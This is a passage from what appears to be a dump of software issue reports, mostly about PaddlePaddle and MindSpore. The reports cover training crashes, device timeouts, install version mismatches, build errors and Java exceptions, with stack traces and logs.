......... I1130 18:30:54.439805 20859 TrainerInternal.cpp:165] Batch=200 samples=25600 AvgCost=2.30457 CurrentCost=2.30111 Eval: classification_error_evaluator=0.897305 CurrentEval: classification_error_evaluator=0.894062 ......... I1130 18:33:53.913244 20859 TrainerInternal.cpp:165] Batch=300 samples=38400 AvgCost=2.30102 CurrentCost=2.2939 Eval: classification_error_evaluator=0.894401 CurrentEval: classification_error_evaluator=0.888594 .Thread [140352166532864] Forwarding batch_norm_1, conv_1, batch_norm_0, conv_0, image, *** Aborted at 1480502060 (unix time) try ""date -d @1480502060"" if you are using GNU date *** PC: @ 0x74bd7c paddle::BaseMatrixT&lt;&gt;::applyUnary&lt;&gt;() *** SIGFPE (@0x74bd7c) received by PID 20859 (TID 0x7fa649079700) from PID 7650684; stack trace: *** ../bin/paddle_local: line 109: 20859 Floating point exception(core dumped) ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2}   <code>: @ 0x7fa710fdb160 (unknown) @ 0x74bd7c paddle::BaseMatrixT&lt;&gt;::applyUnary&lt;&gt;() @ 0x74c193 paddle::BaseMatrixT&lt;&gt;::square() @ 0x5f0ec2 paddle::BatchNormalizationLayer::calMeanAndStd() @ 0x5f25f3 paddle::BatchNormalizationLayer::forward() @ 0x6d5884 paddle::NeuralNetwork::forward() @ 0x6cbcc6 paddle::TrainerThread::forward() @ 0x6ccdec paddle::TrainerThread::computeThread() @ 0x7fa7107558a0 execute_native_thread_routine @ 0x7fa710fd31c3 start_thread @ 0x7fa70fec612d __clone"
[performance]Schedule send/recv op from gpu0 to all devices to overlap memcpy,"For current distributed training implement, all send/recv opswas scheduled on GPU0, I have done some experiments about schedule the send/recv ops on different devices to overlap memcpy. <del>This feature would improve about 9% performance.</del> <del>2* trainers + 4*pservers, 8 GPUs per trainer, parallelexecutor(num_threads=1)</del> <del>1. develop branch</del> <del>2. overlap memcpy branch</del> Please see the latest experiment details in the PR comment #11221:A flag of cuda event need not set.   <code>: Pass = 0, Elapsed = 160, Training performance = 38.328424 imgs/s, Train accuracy = 0.011654, Test accuracy = 0.011765 Pass = 1, Elapsed = 156, Training performance = 39.400293 imgs/s, Train accuracy = 0.009553, Test accuracy = 0.009804 Pass = 0, Elapsed = 146, Training performance = 41.994200 imgs/s, Train accuracy = 0.010613, Test accuracy = 0.009649 Pass = 1, Elapsed = 144, Training performance = 42.671882 imgs/s, Train accuracy = 0.008629, Test accuracy = 0.010768"
"[MS][LITE][master][delegate]NPU_FP32, some model inference timed out in all phones",": /device npu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : NPU_FP32，模型运行卡死 ml_video_edit_video_segment_gauss_adaptis_part2, NPU_FP32, 手机 P20、Iqooz1、P30、Mate30、Enjoyz 用例运行卡死 ml_video_edit_img_segment_adaptise, NPU_FP32, 手机 P20、Iqooz1、P30、Mate30、Enjoyz 用例运行卡死 NPU_FP16，模型运行卡死 ml_video_edit_detect，NPU_FP16, 手机 Iqooz1, P30、Mate30、Enjoyz, Galaxynote20、 Galaxys9 用例运行卡死 ml_video_edit_video_segment_gauss_adaptis_part2, NPU_FP16, 手机 P20、Iqooz1、P30、Mate30、Enjoyz、 Galaxynote20、 Galaxys9 用例运行卡死 ml_video_edit_art_transfer， NPU_FP16, 手机 Iqooz1、P30、Mate30、Enjoyz、 Galaxynote20、 Galaxys9 用例运行卡死 ml_hand_3d_detection， NPU_FP16, 手机 Mate30、Galaxynote20、 Galaxys9 用例运行卡死 ml_video_edit_oneclick_adaptis， NPU_FP16, 手机 Iqooz1、P30、Mate30、Enjoyz、 Galaxynote20、 Galaxys9 用例运行卡死   <code>: 2021-06-24 08:20:24,250 - [INFO] - mindsporetestsdk - host_command - mindsporetestsdk.py:312 - Running Host Command adb -s CLB0219304003305 shell ""(export GLOG_v=1;logcat -c;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/data/local/tmp/lib:/data/local/tmp/hiai_lib;cd /data/local/tmp/; ./new_net_test_mslite GE_NET_LITE_new_net_npu &gt; fmk.log 2&gt;&amp;1 &amp;&amp; echo Success) || echo Failed;echo --*--*--*--*--* Result --*--*--*--*--*;cd /data/local/tmp/;grep ]: fmk.log;grep fabs fmk.log;echo --*--*--*--*--* fmk.log --*--*--*--*--*;cat fmk.log"" 2021-06-24 08:50:24,290 - [INFO] - mindsporetestsdk - info - mindsporetestsdk.py:1073 - Traceback (most recent call last): File ""/root/.local/lib/python3.7/site-packages/paramiko/channel.py"", line 699, in recv out = self.in_buffer.read(nbytes, self.timeout) File ""/root/.local/lib/python3.7/site-packages/paramiko/buffered_pipe.py"", line 164, in read raise PipeTimeout() paramiko.buffered_pipe.PipeTimeout During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""msliteexecutor.py"", line 439, in execute self.do_inference() File ""msliteexecutor.py"", line 268, in do_inference if self.sn is None else self.sdk_.device_command(command, timeout=timeout, sn=self.sn) File ""/root/.local/lib/python3.7/site-packages/mindsporetestsdk.py"", line 1593, in device_command ""adb shell \""{}\"""".format(cmd) if sn == None else ""adb -s {} shell \""{}\"""".format(sn, cmd), timeout=timeout) File ""/root/.local/lib/python3.7/site-packages/mindsporetestsdk.py"", line 318, in host_command return self.ssh_.execute(cmd, timeout=timeout) File ""/root/.local/lib/python3.7/site-packages/mindsporetestssh.py"", line 54, in execute for stdout_line in stdout: File ""/root/.local/lib/python3.7/site-packages/paramiko/file.py"", line 125, in __next__ line = self.readline() File ""/root/.local/lib/python3.7/site-packages/paramiko/file.py"", line 291, in readline new_data = self._read(n) File ""/root/.local/lib/python3.7/site-packages/paramiko/channel.py"", line 1361, in _read return self.channel.recv(size) File ""/root/.local/lib/python3.7/site-packages/paramiko/channel.py"", line 701, in recv raise socket.timeout() socket.timeout FAIL ====================================================================== FAIL: execute (__main__.MSLITE) ---------------------------------------------------------------------- Traceback (most recent call last): File ""msliteexecutor.py"", line 462, in execute self.assertTrue(result_[0] == self.result) AssertionError: False is not true"
[ST][MS][NET][ASR-dynamic][910 8p]epoch time[658.884] is more than 460,"ASR-dynamic网络bs=16，在910环境8p训练，epoch time[658.884]超过460 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:4030fed4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220908 MindSpore 版本：编译时间20220914181553 r1.9.0 commit_id:4030fed4 (/): /mode graph test_ms_asr_dynamic_aishell_train_check_fps_910_8p_0001.py cd solution_test/cases/02network/09audio/asr/train pytest -s test_ms_asr_dynamic_aishell_train_check_fps_910_8p_0001.py 网络训练成功，性能epoch time低于460s 走给程彬   <code>: EPOCH INFO: epoch is 0 step is 748 average_loss_mean: 125.434, aloss_mean : 97.885 closs_mean: 189.713, epoch_running_time: 1625.822 s EPOCH INFO: epoch is 1 step is 1496 average_loss_mean: 84.504, aloss_mean : 77.858 closs_mean: 100.011, epoch_running_time: 656.369 s EPOCH INFO: epoch is 2 step is 2244 average_loss_mean: 71.121, aloss_mean : 64.534 closs_mean: 86.492, epoch_running_time: 658.844 s"
[ms][lite][cpu] segment fault on andoird 7.1.2/rk3288 soc,"Mindspore Lite run graph segment fault on rk3288 : Rk3288 : -- MindSpore version : mindspore lite 1.1 -- Python version : -- OS platform and distribution : Android 7.1.2 -- GCC/Compiler version : Source Code Call inference_mslite::load then inference_mslite::run a segment fault happens Segment fault when session run graph. successful inference frame #0: 0x92fd2336 libmindspore-lite.somindspore::lite::CpuExecutor::Run(std::__ndk1::vector&lt;mindspore::lite::Tensor*, std::__ndk1::allocatormindspore::lite::Tensor* &gt;&amp;, std::__ndk1::vector&lt;mindspore::lite::Tensor*, std::__ndk1::allocatormindspore::lite::Tensor* &gt;&amp;, std::__ndk1::vector&lt;mindspore::kernel::LiteKernel*, std::__ndk1::allocatormindspore::kernel::LiteKernel* &gt;&amp;, mindspore::lite::Allocator*, std::__ndk1::function&lt;bool (std::__ndk1::vector&lt;mindspore::tensor::MSTensor*, std::__ndk1::allocatormindspore::tensor::MSTensor* &gt;, std::__ndk1::vector&lt;mindspore::tensor::MSTensor*, std::__ndk1::allocatormindspore::tensor::MSTensor* &gt;, mindspore::CallBackParam const&amp;)&gt; const&amp;, std::__ndk1::function&lt;bool (std::__ndk1::vector&lt;mindspore::tensor::MSTensor*, std::__ndk1::allocatormindspore::tensor::MSTensor* &gt;, std::__ndk1::vector&lt;mindspore::tensor::MSTensor*, std::__ndk1::allocatormindspore::tensor::MSTensor* &gt;, mindspore::CallBackParam const&amp;)&gt; const&amp;) + 12 SIGSEGV (signal SIGSEGV: invalid address (fault address: 0x8))   <code>: device cpu inference_mslite::inference_mslite() { m_context = std::make_unique&lt;mindspore::lite::Context&gt;(); m_context-&gt;device_list_[0].device_info_.cpu_device_info_.cpu_bind_mode_ = mindspore::lite::HIGHER_CPU; m_context-&gt;device_list_[0].device_info_.cpu_device_info_.enable_float16_ = false; m_context-&gt;device_list_[0].device_type_ = mindspore::lite::DT_CPU; m_context-&gt;thread_num_ = 4; } inference_mslite::~inference_mslite() { m_model-&gt;Free(); delete m_model; delete m_session; } void inference_mslite::load(JNIEnv* env, jobject manager) { AAssetManager* mgr = AAssetManager_fromJava(env, manager); auto asset = AAssetManager_open(mgr, ""mobilenetv2.ms"", AASSET_MODE_BUFFER); auto length = AAsset_getLength(asset); const char* buffer = (const char*)AAsset_getBuffer(asset); m_buffer.resize(length); memcpy(m_buffer.data(), buffer, length); m_session = mindspore::session::LiteSession::CreateSession(m_buffer.data(), m_buffer.size(), m_context.get()); AAsset_close(asset); } void inference_mslite::run() { auto inputs = m_session-&gt;GetInputs(); for (auto input:inputs) { auto data = input-&gt;MutableData(); } auto ret = m_session-&gt;RunGraph(); /** * return result * but a segment fault occurs here */ } mindspore::kernel::LiteKernel::PreProcess() + 150 frame #1: 0x92fc392a libmindspore-lite.so"
SSLException调用HTTPS错误,JDK版本： 1.8.0_131 hutool版本： 5.4.3 本地JDK版本1.8.0_241，环境上JDK版本1.8.0_131，访问HTTPS服务本地正常，环境上异常异常如下 cn.hutool.core.io.IORuntimeException: SSLException: Received fatal alert: internal_error at cn.hutool.http.HttpRequest.send(HttpRequest.java:1111) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:955) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:926) at com.ymm.ai.platform.sdk.util.HttpUtil.doPost(HttpUtil.java:49) at com.ymm.ai.platform.sdk.util.HttpUtil.doHttp(HttpUtil.java:35) at com.ymm.ai.platform.sdk.AiAccessFacade.searchWithCondition(AiAccessFacade.java:91) at com.manbang.alphasolver.match.infra.remote.aiaccess.AiAccessRemote.parseCargoCommentInfo(AiAccessRemote.java:57) at com.manbang.alphasolver.match.core.service.CargoCommentParseService.lambda$null$0(CargoCommentParseService.java:57) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at com.manbang.alphasolver.match.infra.threadpool.CupidFutureTask.run(CupidFutureTask.java:35) at com.alibaba.ttl.TtlRunnable.run(TtlRunnable.java:59) at com.ymm.framework.dgc.thread.EnhancedRunnable.run(EnhancedRunnable.java:23) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at com.alibaba.ttl.TtlRunnable.run(TtlRunnable.java:59) at com.ymm.framework.dgc.thread.EnhancedRunnable.run(EnhancedRunnable.java:23) at com.alibaba.ttl.TtlRunnable.run(TtlRunnable.java:59) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:748)   <code>: HttpResponse responseObj = HttpRequest.post(url) .body(paramStr) .execute();
Ubuntu20.04 GPU版本安装问题,"Ubuntu20.04 pip安装后无法正常运行 kind/bug mindspore-assistant 环境 /device gpu -- MindSpore version (source): -- Python version 3.7.5: -- Linux Ubuntu 20.04: -- gnu gcc/g++ 7.5.0: 按照官方文档，从使用pip安装 报错日志： 报错截图： 报错分析： 我使用了conda创建新环境，python版本为3.7.5，按照官网指令安装，在输入python进入命令模式，import mindspore，提示模块是在Python 3.8下编译的，而目前的解释器版本是3.7.5 其他尝试 我还尝试了源码构建安装，在本地build成功了，使用pip install安装生成的文件，执行报相同错误。 尝试切换虚拟环境，切换到环境，其中Python版本为3.8.5，尝试安装问题，提示该文件不支持本平台，见图中红字部分。   <code>: (base) ? luod@ubuntu20  ~/class/mindspore  ? cfd1bf0ffe  conda activate msp (msp) luod@ubuntu20  ~/class/mindspore  ? cfd1bf0ffe  pip install https://ms-release.obs.cn-north-4.myhuaweicloud.com/1.1.1/MindSpore/gpu/ubuntu_x86/cuda-10.1/mindspore_gpu-1.1.1-cp37-cp37m-linux_x86_64.whl --trusted-host ms-release.obs.cn-north-4.myhuaweicloud.com -i https://pypi.tuna.tsinghua.edu.cn/simple Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple Collecting mindspore-gpu==1.1.1 Using cached https://ms-release.obs.cn-north-4.myhuaweicloud.com/1.1.1/MindSpore/gpu/ubuntu_x86/cuda-10.1/mindspore_gpu-1.1.1-cp37-cp37m-linux_x86_64.whl (106.1 MB) Requirement already satisfied: pillow&gt;=6.2.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (8.1.0) Requirement already satisfied: setuptools&gt;=40.8.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (52.0.0.post20210125) Requirement already satisfied: astunparse&gt;=1.6.3 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.6.3) Requirement already satisfied: easydict&gt;=1.9 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.9) Requirement already satisfied: numpy&lt;=1.17.5,&gt;=1.17.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.17.5) Requirement already satisfied: cffi&gt;=1.13.2 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.14.5) Requirement already satisfied: sympy&gt;=1.4 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.7.1) Requirement already satisfied: packaging&gt;=20.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (20.9) Requirement already satisfied: scipy&gt;=1.5.3 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (1.6.1) Requirement already satisfied: wheel&gt;=0.32.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (0.36.2) Requirement already satisfied: decorator&gt;=4.4.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (4.4.2) Requirement already satisfied: asttokens&gt;=1.1.13 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (2.0.4) Requirement already satisfied: protobuf&gt;=3.8.0 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from mindspore-gpu==1.1.1) (3.15.3) Requirement already satisfied: six in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from asttokens&gt;=1.1.13-&gt;mindspore-gpu==1.1.1) (1.15.0) Requirement already satisfied: pycparser in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from cffi&gt;=1.13.2-&gt;mindspore-gpu==1.1.1) (2.20) Requirement already satisfied: pyparsing&gt;=2.0.2 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from packaging&gt;=20.0-&gt;mindspore-gpu==1.1.1) (2.4.7) Requirement already satisfied: mpmath&gt;=0.19 in /home/luod/anaconda3/envs/msp/lib/python3.7/site-packages (from sympy&gt;=1.4-&gt;mindspore-gpu==1.1.1) (1.2.1) (msp) luod@ubuntu20  ~/class/mindspore  ? cfd1bf0ffe  python Python 3.7.5 (default, Oct 25 2019, 15:51:11) [GCC 7.3.0] :: Anaconda, Inc. on linux Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. &gt;&gt;&gt; import mindspore Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/home/luod/class/mindspore/mindspore/__init__.py"", line 17, in &lt;module&gt; from ._check_version import check_version_and_env_config File ""/home/luod/class/mindspore/mindspore/_check_version.py"", line 332, in &lt;module&gt; check_version_and_env_config() File ""/home/luod/class/mindspore/mindspore/_check_version.py"", line 316, in check_version_and_env_config env_checker.check_env(e) File ""/home/luod/class/mindspore/mindspore/_check_version.py"", line 72, in check_env raise e File ""/home/luod/class/mindspore/mindspore/_check_version.py"", line 310, in check_version_and_env_config from . import _c_expression ImportError: Python version mismatch: module was compiled for Python 3.8, but the interpreter version is incompatible: 3.7.5 (default, Oct 25 2019, 15:51:11) [GCC 7.3.0]. &gt;&gt;&gt; whl import mindspore base whl"
"[CT][MS][csr]For 'Stack', the 'len of input_x' must be int and must >= 1, but got '0' with type 'int'","For 'Stack', the 'len of input_x' must be int and must &gt;= 1, but got '0' with type 'int' / 硬件环境: /device gpu : -- MindSpore version :master-38780 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_csrtensor_values_float32_to_dense pytest -s test_csrtensor.py::test_csrtensor_values_float32_to_dense case pass   <code>: def check_number(arg_value, value, rel, arg_type=int, arg_name=None, prim_name=None): """""" Check argument integer. Usage: - arg_value = check_number(arg_value, 2, Rel.GT, int, ""value"", None) """""" rel_fn = Rel.get_fns(rel) prim_name = f""For \'{prim_name}\', the "" if prim_name else 'The ' arg_name = f""\'{arg_name}\'"" if arg_name else 'input value' prim_info = f'{prim_name}' + f'{arg_name}' if isinstance(arg_value, arg_type): if math.isinf(arg_value) or math.isnan(arg_value) or np.isinf(arg_value) or np.isnan(arg_value): raise ValueError(f""{prim_info} must be a legal value, but got '{arg_value}'."") else: raise TypeError(f""{prim_info} must be {arg_type.__name__}, but got '{type(arg_value).__name__}'"") type_mismatch = not isinstance(arg_value, arg_type) or isinstance(arg_value, bool) type_except = TypeError if type_mismatch else ValueError if type_mismatch or not rel_fn(arg_value, value): rel_str = Rel.get_strs(rel).format(value) &gt; raise type_except(f""{prim_info} must be {arg_type.__name__} and must {rel_str}, "" f""but got '{arg_value}' with type '{type(arg_value).__name__}'."") E ValueError: For 'Stack', the 'len of input_x' must be int and must &gt;= 1, but got '0' with type 'int'."
cmake build problem,"I want to know how to write cmake script to build target. I was keep going the wrong way when I include protobuf header file. for example, I just write a TestCase for Parameter.h, I have to include the ParameterConfig.pb.h. Then a write the cmake script in this way. however, it complain me about the third_party include header error, I can't fix it.   <code>: #include &lt;gtest/gtest.h&gt; #include ""paddle/parameter/Parameter.h"" #include ""ParameterConfig.pb.h"" #include ""TrainerConfig.pb.h"" TEST(Parameter, testConfig) { paddle::ParameterConfig config; config.set_name(""test""); config.set_learning_rate(0.1); std::string data; config.SerializeToString(&amp;data); EXPECT_TRUE(false) &lt;&lt; data; paddle::ParameterConfig ans; ans.ParseFromString(data); CHECK_EQ(ans.name, ""test""); CHECK_EQ(ans.learning_rate, 0.1); } int main(int argc, char** argv) { testing::InitGoogleTest(&amp;argc, argv); initMain(argc, argv); return RUN_ALL_TESTS(); } solution 1. add_executable(test_parameter test_parameter.cpp) target_link_libraries(test_parameter gen_cpp_proto) solution 2. add_dependencies(test_Parameter gen_cpp_proto) add_test(NAME test_Parameter COMMAND test_Parameter ) # add_simple_unittest(test_parameter) Building CXX object paddle/parameter/tests/CMakeFiles/test_parameter.dir/test_parameter.cpp.o In file included from /home/work/dongzhihong/github/Paddle/dzhPaddle/paddle/utils/Logging.h:25:0, from /home/work/dongzhihong/github/Paddle/dzhPaddle/paddle/math/Matrix.h:21, from /home/work/dongzhihong/github/Paddle/dzhPaddle/paddle/parameter/Parameter.h:27, from /home/work/dongzhihong/github/Paddle/dzhPaddle/paddle/parameter/tests/test_parameter.cpp:2: /home/work/dongzhihong/github/Paddle/dzhPaddle/paddle/parameter/tests/test_parameter.cpp: In member function ‘virtual void Parameter_testConfig_Test::TestBody ()’: /home/work/dongzhihong/github/Paddle/dzhPaddle/third_party/install/glog/include/glog/logging.h:745:48: error: no matching function for call to ‘GetReferenceab leValue(&lt;unresolved overloaded function type&gt;)’ google::GetReferenceableValue(val1), \ ^ /home/work/dongzhihong/github/Paddle/dzhPaddle/third_party/install/glog/include/glog/logging.h:764:3: note: in expansion of macro ‘CHECK_OP_LOG’ CHECK_OP_LOG(name, op, val1, val2, google::LogMessageFatal) ^ /home/work/dongzhihong/github/Paddle/dzhPaddle/third_party/install/glog/include/glog/logging.h:788:30: note: in expansion of macro ‘CHECK_OP’ #define CHECK_EQ(val1, val2) CHECK_OP(_EQ, ==, val1, val2)"
inference transpiler does not work properly,"When I use inference transpiler in fluid_benchamark.py, I get much worse test accuracy. This is result of benchmark with inference transpiler: And this is without inference transpiler: This problem is connected with method. works properly.   <code>: python fluid_benchmark.py --device CPU --data_set cifar10 --pass_num 1 --iterations 250 --use_inference_transpiler ... Pass: 0, Iter: 250, Loss: 1.942829 Total examples: 7840, total time: 153.28633, 51.14611 examples/sed Pass: 0, Loss: 1.942829 , Test Accuracy: 0.107514 python fluid_benchmark.py --device CPU --data_set cifar10 --pass_num 1 --iterations 250 ... Pass: 0, Iter: 250, Loss: 2.071917 Total examples: 7840, total time: 154.19125, 50.84594 examples/sed Pass: 0, Loss: 2.071917 , Test Accuracy: 0.256182 fuse_batch_norm fuse_relu_mkldnn"
[CT][MS][numpy_native]np.arange do not support default start,GPU -- MindSpore version : graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: def test_start_stop_kwarg(self): keyword_stop = np.arange(stop=3)
Refine MKLDNNLayer and MKLDNNTester,"The addition for #4008:Add expand operator remove move forward and backward to add and in and use them at child layer. add for , since the weight not updated before.   <code>: copyOutputInfoToOtherDevice MKLDNNLayer reshapeInput() reshapeOutput() MKLDNNLayer UpdateCallback MKLDNNTester"
v1.3.11 - 小版本发布,组件 solon.extend.staticfiles 更新： 静态文件的max-age，由原来的6000s改为600s 可通过配配置进行自定义 调试模式下 maxAge 为0，即不使用浏览器缓存   <code>: solon.staticfiles.maxAge
"首页加载Cannot invoke ""Object.hashCode()"" because ""key"" is null","前端进入首页时发生，我的数据库版本是mysql 8.0.12,代码拉过master的与0.94两个版本 这个方法 /** * 获取所有字典 * @HTTP4O4 */ @GetMapping(""/all"") public ResponseBean all(){ Locale locale = LocaleContextHolder.getLocale(); //语言 String language = locale.getLanguage(); public Map&lt;String, List&gt; all(String language) { LambdaQueryWrapper wrapper = Wrappers.lambdaQuery(); wrapper.eq(GaeaDictItem::getEnabled, Enabled.YES.getValue()) .eq(GaeaDictItem::getLocale, language) .orderByAsc(GaeaDictItem::getSort);//问题行 java.lang.NullPointerException: Cannot invoke ""Object.hashCode()"" because ""key"" is null at java.base/java.util.concurrent.ConcurrentHashMap.get(ConcurrentHashMap.java:936) at com.baomidou.mybatisplus.core.toolkit.LambdaUtils.resolve(LambdaUtils.java:62) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:63) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:59) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:39) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.lambda$orderBy$82c52469$1(AbstractWrapper.java:305) at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1625) at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) at com.baomidou.mybatisplus.core.conditions.segments.OrderBySegmentList.transformList(OrderBySegmentList.java:37) at com.baomidou.mybatisplus.core.conditions.segments.AbstractISegmentList.addAll(AbstractISegmentList.java:60) at com.baomidou.mybatisplus.core.conditions.segments.MergeSegments.add(MergeSegments.java:50) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.doIt(AbstractWrapper.java:464) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.orderBy(AbstractWrapper.java:305) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.orderBy(AbstractWrapper.java:48) at com.baomidou.mybatisplus.core.conditions.interfaces.Func.orderByAsc(Func.java:238) at com.baomidou.mybatisplus.core.conditions.interfaces.Func.orderByAsc(Func.java:219) at com.anjiplus.template.gaea.business.modules.dict.service.impl.GaeaDictServiceImpl.all(GaeaDictServiceImpl.java:166) at com.anjiplus.template.gaea.business.modules.dict.service.impl.GaeaDictServiceImpl$$FastClassBySpringCGLIB$$105cf396.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at com.anjiplus.template.gaea.business.modules.dict.service.impl.GaeaDictServiceImpl$$EnhancerBySpringCGLIB$$c97e9178.all() at com.anjiplus.template.gaea.business.modules.dict.controller.GaeaDictController.all(GaeaDictController.java:113) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:568) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.anji.plus.gaea.GaeaAutoConfiguration$WebGaeaAutoConfiguration.lambda$registrationBean$0(GaeaAutoConfiguration.java:146) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.anjiplus.template.gaea.business.filter.TokenFilter.doFilter(TokenFilter.java:75) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.anjiplus.template.gaea.business.filter.CorsFilter.doFilter(CorsFilter.java:33) at 